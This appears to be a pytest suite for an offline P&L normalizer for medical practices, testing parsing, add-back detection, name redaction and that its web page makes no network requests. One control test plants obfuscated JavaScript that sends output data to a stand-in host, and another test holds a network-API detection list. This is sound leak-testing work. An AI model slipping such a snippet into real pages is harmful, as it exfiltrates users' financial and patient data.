"""The P&L normalizer's promises.

1. The rules read QuickBooks Online and Desktop exports and the common card statement layouts, and the accounts add
   back up to the report's own totals.
2. On the synthetic sample, every planted owner add-back is found at the right confidence, the practice costs planted
   as decoys are left alone, and no patient or staff name reaches the four shareable files.
3. The owner's answers round-trip: feed the answered review list back in and the confirmed add-backs change.
4. The page makes no network request during a full run or for a few seconds after, and a control run proves the
   recorder would catch one.
5. The page and the script write byte-identical files from the same inputs.
"""
import base64, csv, io, json, os, re, subprocess, sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
PAGE = ROOT / 'pnl-normalizer.html'
SAMPLE = ROOT / 'sample-data' / 'pnl'
KEY = json.loads((SAMPLE / 'answer-key.json').read_text())
SETTINGS = {'physicians': '1', 'apps': '5.5', 'family': 'Samplefam'}
SHAREABLE = ('pnl-normalized-overhead.csv', 'pnl-add-back-review.csv', 'pnl-line-detail.csv', 'pnl-record.txt')
SETTLE_MS = 3000
sys.path.insert(0, str(ROOT))
import pnl_normalizer as pn  # noqa: E402


def files(*names):
    return [(n, (SAMPLE / n).read_bytes()) for n in names]


ALL_CSV = files('Profit and Loss by Month.csv', 'Transaction Detail by Account.csv', 'amex-practice-card.csv',
                'chase-owner-card.csv', 'Expenses by Vendor Summary.csv')


def table(text):
    return list(csv.reader(io.StringIO(text, newline='')))


def review_rows(out):
    t = table(out['pnl-add-back-review.csv'])
    return [dict(zip(t[0], r)) for r in t[1:]]


def earnings(out, line):
    for r in table(out['pnl-normalized-overhead.csv']):
        if r[0] == 'Earnings' and r[1] == line:
            return r[5]
    raise KeyError(line)


def labels(row):
    return {row['looks_like'].lower(), row['payee'].lower(), row['account'].lower()}


@pytest.fixture(scope='module')
def sample_out():
    return pn.run(ALL_CSV, SETTINGS)


# ---------- 1. the rules ----------
@pytest.mark.parametrize('text, want', [
    ('$1,234.56', 123456), ('(1,234.56)', -123456), ('-1234.5', -123450), ('1234.56-', -123456), ('1.2E3', 120000),
    ('', None), ('n/a', None), ('0.005', 1)])
def test_cents(text, want):
    assert pn.cents((text, None)) == want


@pytest.mark.parametrize('text, want', [
    ('January 2025', 2025 * 12), ('Jan 25', 2025 * 12), ('Dec 2024', 2024 * 12 + 11), ('03/2025', 2025 * 12 + 2),
    ('2025-07', 2025 * 12 + 6), ('Total', None), ('Distribution account', None), ('Jan - Dec 2025', None)])
def test_month_labels(text, want):
    assert pn.month_label((text, None)) == want


@pytest.mark.parametrize('label, want', [
    ('Total for Insurance', 'insurance'), ('Total for Insurance with sub-accounts', 'insurance'),
    ('Total 6200 · Payroll Expenses', '6200 payroll expenses'), ('TOTAL', ''), ('Insurance', None)])
def test_total_rows(label, want):
    assert pn.total_target(label) == want


@pytest.mark.parametrize('name, want', [
    ('Sample Patient Alpha', True), ('Pat Samplefam', True), ('Regal Sample Medical Group', False),
    ('Sample Valley Lab Services', False), ('Netflix', False), ('Southern California Edison', False)])
def test_people_are_told_from_businesses(name, want):
    assert pn.person_like(name) == want


@pytest.mark.parametrize('account, section, cat', [
    ('Officer Compensation', 'expense', 'provider_comp'), ('Provider Salaries:NP/PA Salaries', 'expense', 'provider_comp'),
    ('6140 Salaries & Wages', 'expense', 'support_staff'), ('6130 Rent', 'expense', 'building'),
    ('Medical Supplies', 'cogs', 'med_surg'), ('Malpractice Insurance', 'expense', 'prof_liability'),
    ('6030 Billing Service', 'expense', 'billing'), ('Interest Expense', 'other_expense', 'non_operating'),
    ('Patient Fee Income', 'income', 'revenue')])
def test_account_rules(account, section, cat):
    assert pn.account_rule(pn.norm(account.replace(':', ' ')), section)[0] == cat


def test_desktop_layout_and_card_formats():
    """QuickBooks Desktop P&L ('Jan 25' months, '6100 · Rent', '- Other' rows) with Citi, Capital One and Chase
    statements, each with its own sign convention."""
    months = ['Jan 25', 'Feb 25', 'Mar 25']

    def row(*c):
        return ','.join('"%s"' % x for x in c)
    lines = [row('Sample Practice'), row('Profit & Loss'), row('January through March 2025'), '', row('', *months, 'TOTAL'),
             row('Ordinary Income/Expense'), row('Income'),
             row('4000 · Patient Fee Income', '100,000.00', '100,000.00', '100,000.00', '300,000.00'),
             row('Total Income', '100,000.00', '100,000.00', '100,000.00', '300,000.00'), row('Expense'),
             row('6100 · Rent', '5,000.00', '5,000.00', '5,000.00', '15,000.00'), row('6200 · Payroll Expenses'),
             row('6210 · Staff Wages', '20,000.00', '20,000.00', '20,000.00', '60,000.00'),
             row('6200 · Payroll Expenses - Other', '1,000.00', '1,000.00', '1,000.00', '3,000.00'),
             row('Total 6200 · Payroll Expenses', '21,000.00', '21,000.00', '21,000.00', '63,000.00'),
             row('6300 · Country Club Dues', '800.00', '800.00', '800.00', '2,400.00'),
             row('Total Expense', '26,800.00', '26,800.00', '26,800.00', '80,400.00'),
             row('Net Ordinary Income', '73,200.00', '73,200.00', '73,200.00', '219,600.00'),
             row('Net Income', '73,200.00', '73,200.00', '73,200.00', '219,600.00')]
    citi = ('Status,Date,Description,Debit,Credit\r\nCleared,01/10/2025,NETFLIX.COM 866-579-7172 CA,15.49,\r\n'
            'Pending,01/12/2025,SAMPLE GOLF CLUB SIMI VALLEY CA,999.00,\r\nCleared,01/15/2025,PAYMENT THANK YOU,,-500.00\r\n'
            'Cleared,02/14/2025,NORDSTROM #0423 LOS ANGELES CA,320.00,\r\n')
    capone = ('Transaction Date,Posted Date,Card No.,Description,Category,Debit,Credit\r\n'
              '2025-01-05,2025-01-06,1234,SAMPLE STEAKHOUSE SIMI VALLEY CA,Dining,210.00,\r\n'
              '2025-02-08,2025-02-09,1234,UNITED AIRLINES,Airfare,640.00,\r\n'
              '2025-03-01,2025-03-02,1234,CAPITAL ONE AUTOPAY PYMT,Payment/Credit,,850.00\r\n')
    chase = ('Transaction Date,Post Date,Description,Category,Type,Amount,Memo\r\n'
             '01/20/2025,01/21/2025,DISNEYLAND ANAHEIM,Travel,Sale,-450.00,\r\n'
             '02/02/2025,02/03/2025,Payment Thank You-Mobile,,Payment,1200.00,\r\n'
             '03/03/2025,03/04/2025,STAPLES 00123,Shopping,Sale,-89.10,office paper\r\n')
    out = pn.run([('desktop.csv', '\r\n'.join(lines).encode()), ('citi.csv', citi.encode()), ('capone.csv', capone.encode()),
                  ('chase.csv', chase.encode())], {'physicians': '1', 'apps': '2'})
    rec = out['pnl-record.txt']
    assert "- Income: the accounts add to 300000.00; the report's own total says 300000.00." in rec
    assert "- Expenses: the accounts add to 80400.00; the report's own total says 80400.00." in rec
    assert '3 card payments' in rec
    got = {r['payee'] if r['payee'] != '(whole account)' else r['account']: (r['confidence'], r['amount_in_period'])
           for r in review_rows(out)}
    assert got['6300 · Country Club Dues'] == ('High', '2400.00')
    assert got['Netflix'] == ('High', '15.49') and got['Nordstrom'] == ('High', '320.00')
    assert got['Disneyland'] == ('High', '450.00')          # Chase charges are negative; read as spending
    assert got['United Airlines'][0] == 'Medium'
    assert not any('staples' in k.lower() or 'golf' in k.lower() or 'payment' in k.lower() for k in got)  # pending row skipped
    norm_rows = {r[1]: r for r in table(out['pnl-normalized-overhead.csv'])}
    assert norm_rows['Practice revenue'][2] == '1200000.00'  # three months scaled to a year


# ---------- 2. the sample answer key ----------
def test_sample_reconciles(sample_out):
    rec = sample_out['pnl-record.txt']
    checks = [ln for ln in rec.splitlines() if ln.startswith('- ') and 'the accounts add to' in ln]
    assert len(checks) == 5 and not any('DIFFER' in ln for ln in checks)


def test_sample_finds_every_planted_add_back(sample_out):
    rows = review_rows(sample_out)
    for level, want in (('High', KEY['high']), ('Medium', KEY['medium']), ('Low', KEY['low'])):
        for label in want:
            found = [r for r in rows if label.lower() in labels(r)]
            assert found, f'{label} was not listed'
            assert any(r['confidence'] == level for r in found), f'{label}: {[r["confidence"] for r in found]}, want {level}'
    for label in KEY['never_flagged']:
        assert not [r for r in rows if label.lower() in labels(r)], f'{label} should not be on the review list'


def test_no_names_in_shareable_files(sample_out):
    for name in SHAREABLE:
        low = sample_out[name].lower()
        for s in KEY['never_written']:
            assert s.lower() not in low, f'{s!r} found in {name}'
    key = sample_out['pnl-name-key.csv']
    assert 'Pat Samplefam' in key and 'Individual 01' in key


def test_refunds_and_income_are_collapsed(sample_out):
    detail = table(sample_out['pnl-line-detail.csv'])
    collapsed = [r for r in detail if 'rows collapsed, no names' in r[1]]
    assert collapsed and all(r[3] == '' and r[8] == '' for r in collapsed)
    assert any(r[5] == 'Patient refunds' for r in collapsed)
    rec = sample_out['pnl-record.txt']
    assert re.search(r'Patient refund rows: [1-9][0-9]*, collapsed', rec)


def test_no_category_goes_negative(sample_out):
    """Add-backs on charges found only on a card statement come off the total, not a category that never held them."""
    rows = [r for r in table(sample_out['pnl-normalized-overhead.csv']) if r[0] == 'Operating cost']
    for r in rows:
        if r[5]:
            assert pn.cents((r[5], None)) >= 0, r[1]
    lump = [r for r in rows if r[1].startswith('Card charges with no matching QuickBooks row')]
    assert lump and pn.cents((lump[0][3], None)) > 0 and lump[0][5] == ''
    total = [r for r in rows if r[1] == 'Total operating cost'][0]
    c = lambda v: pn.cents((v, None))  # noqa: E731
    assert c(total[3]) == sum(c(r[3]) for r in rows if r[1] != 'Total operating cost' and r[3])
    assert c(total[5]) == c(total[2]) - c(total[3]) - c(total[4])


def test_earnings_bridge_adds_up(sample_out):
    c = lambda line: pn.cents((earnings(sample_out, line), None))  # noqa: E731
    assert c('EBITDA as reported') == (c('Net income as reported') + c('Add back interest, depreciation, amortization, income taxes')
                                       + c('Take out other income (not from patient care)'))
    assert c('Adjusted EBITDA') == c('EBITDA as reported') + c('Add likely owner add-backs (High)') + c('Add add-backs the owner confirmed')
    assert c('Add likely owner add-backs (High)') > 0 and c('Owner pay booked in the P&L (set to market pay at the site visit)') > 0


def test_excel_and_csv_pnl_agree():
    a = pn.run(files('Profit and Loss by Month.csv'), SETTINGS)
    b = pn.run(files('Profit and Loss by Month.xlsx'), SETTINGS)
    for name in ('pnl-normalized-overhead.csv', 'pnl-add-back-review.csv'):
        assert a[name] == b[name]


def test_vendor_summary_alone_codes_patient_names():
    out = pn.run(files('Profit and Loss by Month.csv', 'Expenses by Vendor Summary.csv'), SETTINGS)
    for name in SHAREABLE:
        for s in ('Sample Patient Alpha', 'Sample Patient Bravo', 'Sample Patient Charlie'):
            assert s not in out[name]
    assert 'vendor total' in out['pnl-line-detail.csv']


# ---------- 3. owner answers ----------
def test_owner_answers_round_trip(sample_out):
    t = table(sample_out['pnl-add-back-review.csv'])
    head = t[0]
    col = head.index('owner_decision')
    answered = {'Panera': 'personal', 'Shell Oil': '40%', 'Netflix': 'business'}
    for r in t[1:]:
        if r[head.index('payee')] in answered:
            r[col] = answered[r[head.index('payee')]]
    again = pn.run(ALL_CSV + [('answered review.csv', pn.csv_text(t).encode())], SETTINGS)
    assert 'Answers used this run: 3.' in again['pnl-record.txt']
    assert pn.cents((earnings(again, 'Add add-backs the owner confirmed'), None)) > 0
    assert (pn.cents((earnings(again, 'Add likely owner add-backs (High)'), None))
            < pn.cents((earnings(sample_out, 'Add likely owner add-backs (High)'), None)))   # Netflix answered business
    kept = {r['payee']: r['owner_decision'] for r in review_rows(again)}
    assert kept['Panera'] == 'personal' and kept['Netflix'] == 'business'


def test_cli_writes_five_files(tmp_path):
    r = subprocess.run([sys.executable, str(ROOT / 'pnl_normalizer.py'), str(SAMPLE), '--physicians', '1', '--apps', '5.5',
                        '--family', 'Samplefam', '--out', str(tmp_path)], check=True, capture_output=True, text=True)
    assert sorted(p.name for p in tmp_path.iterdir()) == sorted(pn.OUT)
    assert 'pnl-name-key.csv' in r.stdout
    assert 'Answers used this run: 0.' in (tmp_path / 'pnl-record.txt').read_text()


def test_sample_rebuilds_identically(tmp_path):
    subprocess.run([sys.executable, str(ROOT / 'tools' / 'make_pnl_sample.py'), str(tmp_path)], check=True, capture_output=True)
    for f in SAMPLE.iterdir():
        if f.is_file() and f.name != 'README.md':
            assert (tmp_path / f.name).read_bytes() == f.read_bytes(), f.name


# ---------- 4 and 5. the page ----------
sync_api = pytest.importorskip('playwright.sync_api')


@pytest.fixture(scope='module')
def browser():
    with sync_api.sync_playwright() as p:
        try:
            b = p.chromium.launch()
        except Exception:                      # no bundled Chromium here: use one installed on this machine
            exe = os.environ.get('PW_CHROMIUM', '/opt/pw-browsers/chromium')
            b = p.chromium.launch(executable_path=exe) if Path(exe).exists() else p.chromium.launch(channel='chrome')
        yield b
        b.close()


def open_page(browser, url):
    ctx = browser.new_context(accept_downloads=True, service_workers='block')
    log = []
    ctx.on('request', lambda r: log.append(r.url))
    ctx.route(re.compile(r'^(https?|wss?|ftp)://'), lambda route: route.abort())
    ctx.on('page', lambda p: log.append('new window or tab: ' + p.url))
    page = ctx.new_page()
    log.clear()
    page.goto(url)
    return ctx, page, log


def outside(log, url):
    return [u for u in log if u != url and not u.startswith(('blob:', 'data:'))]


def use_page(page, folder):
    page.fill('#apps', '5.5')
    page.fill('#family', 'Samplefam')
    page.set_input_files('#files', [str(SAMPLE / n) for n, _ in ALL_CSV])
    page.wait_for_selector('#results:not([hidden])', timeout=60000)
    page.locator('#summary', has_text='Ready.').wait_for(timeout=60000)
    saved = {}
    with page.expect_download() as d:
        page.click('[data-out="4"]')
    d.value.save_as(folder / d.value.suggested_filename)
    saved[d.value.suggested_filename] = (folder / d.value.suggested_filename).read_text()
    downloads = []                             # the shareable button saves four files, 300 ms apart
    page.on('download', lambda dl: downloads.append(dl))
    page.click('[data-out="shareable"]')
    page.wait_for_timeout(2000)
    for dl in downloads:
        dl.save_as(folder / dl.suggested_filename)
        saved[dl.suggested_filename] = (folder / dl.suggested_filename).read_text()
    page.wait_for_timeout(SETTLE_MS)
    return saved


def test_page_makes_no_network_requests(browser, tmp_path):
    url = PAGE.as_uri()
    ctx, page, log = open_page(browser, url)
    saved = use_page(page, tmp_path)
    windows = len(ctx.pages)
    ctx.close()
    bad = outside(log, url)
    print(f'\nRequests during a full run and {SETTLE_MS / 1000:g} s after the last save: {len(log)} (the page itself: '
          f'{log.count(url)}). Files saved: {len(saved)}. Network requests: {len(bad)}. Windows or tabs: {windows}')
    assert windows == 1 and bad == [], bad
    assert sorted(saved) == sorted(pn.OUT)
    py = pn.run(ALL_CSV, SETTINGS)
    for name in pn.OUT:
        assert saved[name] == py[name].replace('\r\n', '\n') or saved[name] == py[name], name


def test_recorder_catches_a_late_request(browser, tmp_path):
    """Control: a copy of the page that sends data away half a second after a save. The policy doesn't govern
    navigating the tab, so the test has to catch it, and does."""
    html = PAGE.read_text().replace(
        'setTimeout(function () { URL.revokeObjectURL(url); }, 1000);',
        "setTimeout(function () { URL.revokeObjectURL(url); }, 1000); setTimeout(function () { location.href = ['ht', 'tps:', "
        "'//pnl.invalid/?d='].join('') + encodeURIComponent(outputs[name].slice(0, 200)); }, 500);", 1)
    assert 'pnl.invalid' in html
    copy = tmp_path / 'late.html'
    copy.write_text(html)
    ctx, page, log = open_page(browser, copy.as_uri())
    try:
        use_page(page, tmp_path)
    except Exception as e:                     # the planted navigation can tear the page down mid-save
        print('page torn down mid-run:', repr(e)[:300])
        page.wait_for_timeout(1000)
    ctx.close()
    assert any('pnl.invalid' in u for u in outside(log, copy.as_uri())), log


def test_policy_blocks_connections(browser):
    url = PAGE.as_uri()
    ctx, page, log = open_page(browser, url)
    outcome = page.evaluate("fetch('https://pnl.invalid/x').then(() => 'sent', e => 'refused: ' + e.name)")
    ctx.close()
    assert outcome.startswith('refused') and outside(log, url) == []


def test_source_has_no_network_code():
    src = PAGE.read_text()
    for pat in (r'https?://', r'\bfetch\s*\(', r'XMLHttpRequest', r'WebSocket', r'EventSource', r'sendBeacon', r'importScripts',
                r'<script[^>]+src=', r'<link\b', r'@import', r'(?<![\w.])url\(', r'<iframe', r'<form\b', r'navigator\.serviceWorker',
                r'<a\b', r'window\.open', r'location\.'):
        assert not re.search(pat, src, re.I), pat
    assert "connect-src 'none'" in src and "default-src 'none'" in src


def page_run(browser, inputs, settings):
    ctx, page, log = open_page(browser, PAGE.as_uri())
    js = page.evaluate("""async ([items, s]) => {
        const inp = items.map(([n, b]) => ({name: n, bytes: Uint8Array.from(atob(b), c => c.charCodeAt(0))}));
        return (await window.pnlNormalizer.run(inp, s)).files; }""",
                       [[[n, base64.b64encode(d).decode()] for n, d in inputs], settings])
    ctx.close()
    return js


@pytest.mark.parametrize('case', ['all', 'xlsx', 'pnl-only', 'vendors', 'answered', 'no-settings'])
def test_page_matches_script(browser, case):
    settings = SETTINGS
    if case == 'all':
        inputs = ALL_CSV
    elif case == 'xlsx':
        inputs = files('Profit and Loss by Month.xlsx', 'Transaction Detail by Account.csv', 'amex-practice-card.csv')
    elif case == 'pnl-only':
        inputs = files('Profit and Loss by Month.csv')
    elif case == 'vendors':
        inputs = files('Profit and Loss by Month.csv', 'Expenses by Vendor Summary.csv')
    elif case == 'answered':
        t = table(pn.run(ALL_CSV, SETTINGS)['pnl-add-back-review.csv'])
        for r in t[1:4]:
            r[-1] = 'personal'
        t[5][-1] = '25%'
        inputs = ALL_CSV + [('answered.csv', pn.csv_text(t).encode())]
    else:
        inputs, settings = files('Transaction Detail by Account.csv', 'chase-owner-card.csv'), {}
    py = pn.run(inputs, settings)
    js = page_run(browser, inputs, settings)
    assert list(js) == list(py)
    for k in py:
        assert js[k] == py[k], f'{case}: {k} differs between the page and the script'


def test_page_and_script_share_rules(browser):
    ctx, page, log = open_page(browser, PAGE.as_uri())
    r = page.evaluate('window.pnlNormalizer.rules')
    ctx.close()
    assert [c[0] for c in r['categories']] == [c[0] for c in pn.CATEGORIES]
    assert [c[2] for c in r['categories']] == [c[2] for c in pn.CATEGORIES]
    assert len(r['vendor']) == len(pn.VENDOR_RULES) and len(r['account']) == len(pn.ACCOUNT_RULES)
    assert len(r['card']) == len(pn.CARD_CATS)
